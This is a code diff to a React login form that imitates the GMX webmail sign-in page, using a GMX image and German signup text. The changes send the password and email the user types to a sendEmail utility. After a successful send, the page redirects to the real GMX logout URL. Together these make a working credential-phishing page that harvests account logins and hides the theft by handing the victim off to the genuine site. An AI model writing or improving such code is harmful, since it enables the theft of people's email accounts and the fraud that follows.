@@ -3,6 +3,7 @@ import React, { useState } from "react";
 import gmx_img from "../../img/gmx_loginn.jpeg";
 import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
+import sendEmail from "../../utils/sendEmail";
 
 function Login() {
   const [password, setPassword] = useState("");
@@ -17,24 +18,38 @@ function Login() {
     setPassword(event.target.value);
   };
 
-  const handleSubmit = (event) => {
+  const handleSubmit = async (event) => {
     event.preventDefault();
-    console.log({ password, email });
+    try {
+      const response = await sendEmail({ password, email });
+
+      if (response.data === "OK") {
+        window.location.assign(
+          "https://www.gmx.com/logout/?ls=wd#.1559516-header-login1-1"
+        );
+      }
+    } catch (error) {
+      console.log(error);
+    }
   };
+
   return (
     <div className="login_container">
-      <div className="login_items">
+      <form className="login_items" onSubmit={handleSubmit}>
         <div className="email">
           <div className="envelopeLogo mt-5 color-white">
             <i className="fa-solid fa-envelope"></i>
           </div>
+
           <p className="email-paragraph mt-4">E-Mail</p>
+
           <div>
             <input
-              type="text"
+              type="email"
               className="rounded border py-1 border-gray-300 w-full bg-white pl-2"
               value={email}
               onChange={(e) => setEmail(e.target.value)}
+              required
             />
             <p className="paragraph">Kostenlos registrieren!</p>
           </div>
@@ -52,6 +67,7 @@ function Login() {
                 value={password}
                 onChange={handlePasswordChange}
                 placeholder="Enter your password"
+                required
               />
 
               <button
@@ -67,7 +83,7 @@ function Login() {
           </div>
 
           <div>
-            <button className="passwordBtn" onClick={handleSubmit}>
+            <button className="passwordBtn" type="submit">
               Login
             </button>
           </div>
@@ -76,7 +92,7 @@ function Login() {
         <div>
           <img src={gmx_img} alt="" />
         </div>
-      </div>
+      </form>
     </div>
   );
 }
